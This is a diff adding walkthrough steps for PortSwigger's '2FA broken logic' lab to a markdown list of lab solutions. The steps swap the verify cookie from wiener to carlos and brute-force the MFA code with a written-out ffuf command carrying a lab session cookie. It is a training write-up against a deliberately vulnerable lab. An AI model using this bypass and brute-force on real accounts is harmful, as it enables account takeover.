@@ -47,6 +47,15 @@
    - Login after the wait time is completed.
 
 8.  [2FA broken logic](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic)
+   - Login as `wiener`.
+   - Send the request to repeater.
+   - Use the request to trigger a mfa code to `carlos`.
+   - Change the cookie from `verify=wiener` to `verify=carlos`.
+   - Use burp intruder to bruteforce the login code in mfa page.
+   - Note: Use below command in FFUF to bruteforce the login code.
+      ```
+      ffuf -w mfa_wordlist.txt:FUZZ -u "https://0a3a00620456a0f483f6e1a8004b00a5.web-security-academy.net/login2" -mc 302 -b "session=c4lf8n8fnIhAOUlR05tCTqtnK2ykkrV8; verify=carlos" -H "Referer: https://0a3a00620456a0f483f6e1a8004b00a5.web-security-academy.net/login2" -X POST -d mfa-code=FUZZ
+      ```
 
 9.  [Brute-forcing a stay-logged-in cookie](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie)
 
